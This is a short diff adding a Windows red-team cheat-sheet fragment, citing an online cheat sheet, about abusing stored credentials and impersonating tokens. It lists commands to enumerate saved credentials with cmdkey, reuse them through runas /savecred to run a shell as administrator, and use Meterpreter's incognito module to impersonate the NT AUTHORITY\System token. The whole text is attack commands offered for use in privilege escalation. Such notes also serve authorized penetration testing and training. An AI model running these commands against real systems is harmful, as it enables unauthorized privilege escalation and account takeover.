@@ -1,0 +1,13 @@
+# Stored Credentials
+# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+# To check if there is any stored keys
+cmdkey /list
+
+# Using them
+runas /user:administrator /savecred "cmd.exe /k whoami"
+
+
+# Impersonating Tokens with meterpreter
+use incognito
+list_tokens -u
+impersonate_token NT-AUTHORITY\System
